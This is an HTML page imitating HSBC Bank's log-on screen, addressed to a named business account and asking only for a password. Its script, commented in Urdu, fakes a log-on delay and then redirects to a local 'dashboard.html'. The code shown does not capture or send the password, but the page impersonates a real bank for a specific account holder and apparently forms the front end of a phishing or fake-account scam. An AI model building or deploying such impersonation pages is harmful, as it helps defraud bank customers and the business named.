<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>HSBC Bank - Log On</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; }
        
        /* Top Header */
        .top-bar { background-color: #fff; padding: 15px 40px; border-bottom: 2px solid #db0011; display: flex; align-items: center; }
        .logo-img { height: 30px; width: auto; margin-right: 12px; }
        .brand-name { font-size: 20px; font-weight: bold; color: #db0011; }
        
        /* Login Container */
        .login-container { display: flex; justify-content: center; align-items: center; min-height: 80vh; }
        .login-box { background: #fff; padding: 30px; border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); width: 380px; }
        .login-box h3 { margin-top: 0; color: #333; font-size: 15px; font-weight: 600; line-height: 1.4; }
        
        .input-group { margin-bottom: 20px; margin-top: 20px; }
        .input-group label { display: block; font-size: 12px; color: #666; margin-bottom: 5px; }
        .input-group input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 3px; box-sizing: border-box; outline: none; }
        
        .btn-submit { width: 100%; padding: 12px; background-color: #db0011; color: #fff; border: none; border-radius: 3px; font-weight: bold; cursor: pointer; font-size: 14px; }
        .btn-submit:hover { background-color: #b8000e; }
        
        .links { margin-top: 15px; font-size: 12px; }
        .links a { color: #0066cc; text-decoration: none; display: block; margin-top: 5px; }

        /* Loading Screen Overlay */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.85);
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 2000;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #db0011;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <!-- Loading Spinner Screen -->
    <div class="loading-overlay" id="loadingSpinner">
        <div class="spinner"></div>
        <p style="margin-top: 18px; font-weight: bold; color: #333; font-size: 14px;">Logging on, please wait...</p>
    </div>

    <!-- Top Bar -->
    <div class="top-bar">
        <img src="logo.jpeg" alt="HSBC Logo" class="logo-img">
        <span class="brand-name">HSBC Bank</span>
    </div>

    <!-- Login Box -->
    <div class="login-container">
        <div class="login-box">
            <h3>For the account: Junaid Ikram painting contracting L.L.C</h3>
            <form id="loginForm" onsubmit="handleLogin(event)">
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" placeholder="Enter password" required>
                </div>
                <button type="submit" class="btn-submit">Log On</button>
            </form>
            <div class="links">
                <a href="#">Forgotten password?</a>
                <a href="#">Log on using a physical device?</a>
            </div>
        </div>
    </div>

    <!-- JavaScript for Loading Delay -->
    <script>
        function handleLogin(event) {
            event.preventDefault(); // فارم کو ڈائریکٹ سبمٹ ہونے سے روکنا
            
            // لوڈنگ اسکرین ظاہر کرنا
            var loader = document.getElementById('loadingSpinner');
            loader.style.display = 'flex';

            // 2.5 سیکنڈ کی لوڈنگ کے بعد ڈیش بورڈ پیج پر جانا
            setTimeout(function() {
                window.location.href = 'dashboard.html';
            }, 2500);
        }
    </script>

</body>
</html>
